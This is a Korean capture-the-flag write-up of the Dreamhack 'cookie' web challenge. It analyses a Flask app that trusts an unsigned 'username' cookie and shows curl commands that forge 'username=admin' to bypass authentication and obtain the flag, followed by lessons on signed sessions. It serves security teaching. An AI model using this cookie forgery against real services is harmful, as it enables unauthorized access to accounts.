---
ctf_name: "Dreamhack-Wargame"
challenge_name: "cookie"
category: "web"
difficulty: "easy"
author: "yeahhbean"
date: "2026-06-23"
points: 0
tags: [cookie, authentication-bypass, broken-access-control, client-side-trust]
---

# cookie

## 문제 설명

> 쿠키를 이용해 인증을 구현한 웹 서비스. `admin` 계정으로 인증하면 플래그를 획득할 수 있다.

- 출처: Dreamhack Wargame (web, LEVEL 1) — <https://dreamhack.io/wargame/challenges/6>
- 제공 파일: `app.py` (Flask 서버 소스)

## 풀이

### 분석

서버는 단일 Flask 앱이고, 인증 상태를 **오직 쿠키 하나(`username`)** 로만 관리한다.

```python
users = {
    'guest': 'guest',
    'admin': FLAG
}

@app.route('/')
def index():
    username = request.cookies.get('username', None)
    if username:
        return render_template('index.html',
            text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
    return render_template('index.html')
```

`/` 라우트는 요청에 들어온 `username` 쿠키를 그대로 신뢰한다. 값이 `admin`이면 플래그를 렌더링하고, 아니면 `you are not admin`을 출력한다.

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    ...
    if pw == password:
        resp = make_response(redirect(url_for('index')))
        resp.set_cookie('username', username)   # 서명 없는 평문 쿠키
        return resp
```

로그인 성공 시 `set_cookie('username', username)`로 쿠키를 심는데, **서명(signature)도, 세션 저장소 매핑도 없다.** Flask의 `session`(서버 비밀키로 서명되는 쿠키)이 아니라 그냥 날 평문 쿠키다. 즉 클라이언트가 쿠키 값을 마음대로 바꿔도 서버는 검증할 방법이 없다.

`admin`의 비밀번호는 `FLAG`이므로 정상 로그인은 불가능하지만, **인증의 신뢰 경계가 쿠키 값 그 자체**라서 로그인 단계를 건너뛰고 쿠키만 위조하면 된다.

### 취약점

- **Broken Access Control / Client-Side Trust**: 권한 판별(`username == "admin"`)을 클라이언트가 전송한 쿠키 값에만 의존한다.
- 쿠키에 **무결성 보호(서명·암호화)가 없음**. 서버는 위조 여부를 판단할 수 없다.
- 인증 상태를 서버 측 세션 저장소에 매핑하지 않고 쿠키 평문으로 들고 있어, `guest` → `admin` 수평/수직 권한 상승이 자유롭게 가능하다.

### 익스플로잇

별도 스크립트 없이 쿠키 한 줄만 바꾸면 끝난다.

1. `guest / guest`로 로그인 → `username=guest` 쿠키 발급 확인
2. 같은 쿠키를 `username=admin`으로 변조해서 `/` 재요청
3. 응답의 `flag is ...` 부분에서 플래그 회수

브라우저면 개발자도구 → Application → Cookies에서 `username` 값을 `admin`으로 바꾸고 새로고침해도 동일하다.

**로컬 재현 (동일 소스 기준 검증)**

```bash
# [1] 쿠키 없이 접속 — 인증 정보 없음
$ curl -s http://HOST:PORT/
<div></div>

# [2] guest 로그인 — 서명 없는 평문 쿠키가 그대로 발급됨
$ curl -s -i -X POST http://HOST:PORT/login -d "username=guest&password=guest"
HTTP/1.1 302 FOUND
Location: /
Set-Cookie: username=guest; Path=/

# [3] guest 쿠키로 접속 — 권한 없음
$ curl -s http://HOST:PORT/ -b "username=guest"
<div>Hello guest, you are not admin</div>

# [4] [EXPLOIT] 쿠키를 admin으로 위조 — 플래그 노출
$ curl -s http://HOST:PORT/ -b "username=admin"
<div>Hello admin, flag is DH{...}</div>
```

`solve.py`도 함께 첨부했다. (실제 인스턴스의 `HOST:PORT`만 채워서 실행하면 플래그를 파싱해 출력한다.)

## 플래그

`admin` 쿠키로 접속했을 때 응답에 출력되는 `DH{...}` 값.

```
DH{...}   # 실제 값은 본인 인스턴스의 admin 응답에서 회수
```

> 로컬 재현 시 임의의 `flag.txt`로 동작을 검증했고, 위조 쿠키로 admin 응답에서 플래그가 정상 노출되는 것까지 확인했다. 실제 점수 인증용 플래그는 라이브 인스턴스의 admin 응답에 그대로 찍힌다.

## 배운 점

- 인증/인가 상태를 **클라이언트가 전송하는 값에 직접 의존**하면 안 된다. 권한 판별의 근거는 항상 서버가 신뢰할 수 있는 출처여야 한다.
- 쿠키로 상태를 들고 가려면 최소한 **서명(HMAC) 또는 암호화**가 필요하다. Flask라면 평문 `set_cookie` 대신 비밀키로 서명되는 `session`을 쓰는 게 기본.
- 더 안전한 설계는 **서버 측 세션 저장소**에 랜덤 세션 ID를 매핑하고, 쿠키에는 추측·위조 불가능한 세션 ID만 담는 것. 권한은 세션 ID로 서버에서 조회한다.
- "로그인을 못 뚫겠다"가 막다른 길이 아니다. 인증의 **신뢰 경계가 어디인지**를 보면, 로그인 자체를 우회하는 더 짧은 경로가 보인다.
